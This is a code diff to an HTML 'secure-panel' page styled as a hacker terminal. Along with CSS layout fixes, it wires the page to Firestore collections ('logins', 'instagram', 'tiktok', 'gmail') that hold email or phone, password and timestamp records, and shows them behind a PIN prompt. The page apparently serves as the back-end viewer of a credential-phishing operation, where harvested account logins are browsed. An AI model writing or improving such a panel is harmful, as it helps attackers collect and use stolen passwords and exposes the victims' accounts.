@@ -19,11 +19,10 @@
             min-height: 100vh;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
-            position: relative;
+            /* Removed overflow: hidden to allow page scrolling */
         }
         #matrixCanvas {
-            position: absolute;
+            position: fixed; /* Changed to fixed to cover entire viewport */
             top: 0;
             left: 0;
             width: 100%;
@@ -53,10 +52,10 @@
         }
         .container {
             width: 100vw;
-            height: 100vh;
+            min-height: 100vh; /* Changed from height to min-height */
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: flex-start; /* Changed to flex-start to allow expansion */
             align-items: center;
             padding: 20px;
             position: relative;
@@ -74,6 +73,7 @@
             position: relative;
             overflow: hidden;
             z-index: 2;
+            margin-bottom: 20px; /* Added to prevent overlap with footer */
         }
         .terminal::before {
             content: '';
@@ -194,6 +194,8 @@
             border-radius: 6px;
             overflow: hidden;
             box-shadow: 0 0 15px rgba(0, 247, 255, 0.3);
+            max-height: 300px;
+            overflow-y: auto;
         }
         .data-table th, .data-table td {
             border: 1px solid rgba(0, 247, 255, 0.3);
@@ -206,26 +208,28 @@
             color: #00f7ff;
             text-shadow: 0 0 5px rgba(0, 247, 255, 0.7);
             font-weight: bold;
+            position: sticky;
+            top: 0;
+            z-index: 1;
         }
         .data-table tr:nth-child(even) {
             background-color: rgba(0, 51, 102, 0.2);
         }
         .data-table tr:hover {
             background-color: rgba(0, 247, 255, 0.15);
-            box-shadow: inset 0 diffract 10px rgba(0, 247, 255, 0.3);
+            box-shadow: inset 0 0 10px rgba(0, 247, 255, 0.3);
         }
         .footer {
             text-align: center;
             padding: 15px;
             color: #00cc00;
             font-size: 12px;
-            position: absolute;
-            bottom: 0;
             width: 100%;
             background-color: rgba(0, 0, 0, 0.6);
             z-index: 2;
             font-family: 'Share Tech Mono', monospace;
             letter-spacing: 1px;
+            margin-top: auto; /* Pushes footer to bottom of content */
         }
         .status-bar {
             display: flex;
@@ -351,7 +355,11 @@
         @copyright@secure-panel // ENCRYPTED CHANNEL // v2.7.4
     </div>
 
-    <script>
+    <script type="module">
+        // Import Firebase
+        import { db } from './firebase.js';
+        import { collection, getDocs } from "https://www.gstatic.com/firebasejs/11.7.3/firebase-firestore.js";
+
         // Matrix background effect
         const canvas = document.getElementById('matrixCanvas');
         const ctx = canvas.getContext('2d');
@@ -406,11 +414,13 @@
             messageElement.textContent = message;
             output.appendChild(messageElement);
             output.scrollTop = output.scrollHeight;
+            output.offsetHeight; // Trigger reflow
         }
         
         // Clear input
         function clearInput() {
             commandInput.value = '';
+            commandInput.focus();
         }
         
         // Display help information
@@ -425,11 +435,11 @@
                 appendOutput('2 - Instagram', 'system');
                 appendOutput('3 - TikTok', 'system');
                 appendOutput('4 - Gmail', 'system');
+            } else if (state === 'waiting_for_pin') {
+                appendOutput('[pin] - Enter access PIN', 'system');
             } else if (state === 'platform_selected') {
                 appendOutput('/retrieve - Retrieve data', 'system');
                 appendOutput('/clear - Clear terminal', 'system');
-            } else if (state === 'waiting_for_pin') {
-                appendOutput('[pin] - Enter access PIN', 'system');
             }
             
             appendOutput('/help - Show available commands', 'system');
@@ -450,7 +460,7 @@
         // Handle platform selection
         function handlePlatformSelection(input) {
             const platforms = {
-                '1': 'facebook',
+                '1': 'logins',
                 '2': 'instagram',
                 '3': 'tiktok',
                 '4': 'gmail'
@@ -466,39 +476,44 @@
             }
         }
         
+        // Fetch data from Firestore
+        async function fetchData(platform) {
+            try {
+                // Debug: Verify db instance
+                if (!db) {
+                    throw new Error('Firestore instance (db) is not initialized');
+                }
+                const querySnapshot = await getDocs(collection(db, platform));
+                const data = [];
+                querySnapshot.forEach((doc) => {
+                    const docData = doc.data();
+                    data.push({
+                        email: docData.email || docData.phone || 'N/A',
+                        password: docData.password || '******',
+                        timestamp: docData.timestamp || 'N/A'
+                    });
+                });
+                return data;
+            } catch (error) {
+                appendOutput(`Error fetching data: ${error.message}`, 'error');
+                return [];
+            }
+        }
+        
         // Display data for selected platform
-        function displayData(platform) {
+        async function displayData(platform) {
             dataBody.innerHTML = '';
             dataTable.style.display = 'table';
             
-            const platformData = {
-                facebook: [
-                    { email: "user1@fb.com", password: "******", timestamp: "2025-07-10 18:30:22" },
-                    { email: "user2@facebook.com", password: "******", timestamp: "2025-07-10 18:28:17" },
-                    { email: "+1234567890", password: "******", timestamp: "2025-07-10 18:25:41" },
-                    { email: "admin@fb.com", password: "******", timestamp: "2025-07-10 18:22:08" }
-                ],
-                instagram: [
-                    { email: "user1@ig.com", password: "******", timestamp: "2025-07-10 17:45:33" },
-                    { email: "influencer@instagram.com", password: "******", timestamp: "2025-07-10 17:42:19" },
-                    { email: "brand@company.com", password: "******", timestamp: "2025-07-10 17:40:05" },
-                    { email: "photographer@ig.com", password: "******", timestamp: "2025-07-10 17:38:51" }
-                ],
-                tiktok: [
-                    { email: "creator@tiktok.com", password: "******", timestamp: "2025-07-10 16:25:18" },
-                    { email: "user2@tt.com", password: "******", timestamp: "2025-07-10 16:22:49" },
-                    { email: "influencer@tt.com", password: "******", timestamp: "2025-07-10 16:20:27" },
-                    { email: "brand@tiktok.com", password: "******", timestamp: "2025-07-10 16:18:12" }
-                ],
-                gmail: [
-                    { email: "user1@gmail.com", password: "******", timestamp: "2025-07-10 15:15:44" },
-                    { email: "business@company.com", password: "******", timestamp: "2025-07-10 15:13:22" },
-                    { email: "developer@tech.io", password: "******", timestamp: "2025-07-10 15:10:07" },
-                    { email: "admin@org.com", password: "******", timestamp: "2025-07-10 15:08:33" }
-                ]
-            };
+            const platformData = await fetchData(platform);
             
-            platformData[platform].forEach(item => {
+            if (platformData.length === 0) {
+                appendOutput(`No data found for ${platform.charAt(0).toUpperCase() + selectedPlatform.slice(1)}.`, 'info');
+                dataTable.style.display = 'none';
+                return;
+            }
+            
+            platformData.forEach(item => {
                 const row = document.createElement('tr');
                 row.innerHTML = `
                     <td>${item.email}</td>
@@ -508,14 +523,15 @@
                 dataBody.appendChild(row);
             });
             
-            appendOutput(`Data retrieved for ${platform.charAt(0).toUpperCase() + platform.slice(1)}.`, 'success');
+            appendOutput(`Data retrieved for ${platform.charAt(0).toUpperCase() + selectedPlatform.slice(1)}.`, 'success');
             state = 'platform_selected';
         }
         
         // Handle command input
-        commandInput.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter') {
+        commandInput.addEventListener('keydown', async function(event) {
+            if (event.key === 'Enter' && commandInput.value.trim() !== '') {
                 const command = commandInput.value.trim().toLowerCase();
+                
                 appendOutput(`$ ${command}`, 'system');
                 clearInput();
                 
@@ -532,7 +548,7 @@
                 } else if (state === 'waiting_for_pin') {
                     if (command === correctPin) {
                         appendOutput('Access granted.', 'success');
-                        displayData(selectedPlatform);
+                        await displayData(selectedPlatform);
                     } else {
                         pinAttempts++;
                         if (pinAttempts >= 3) {
@@ -544,7 +560,8 @@
                     }
                 } else if (state === 'platform_selected') {
                     if (command === '/retrieve') {
-                        displayData(selectedPlatform);
+                        appendOutput('Enter access PIN:', 'info');
+                        state = 'waiting_for_pin';
                     } else if (command === '/clear') {
                         output.innerHTML = '';
                         dataTable.style.display = 'none';
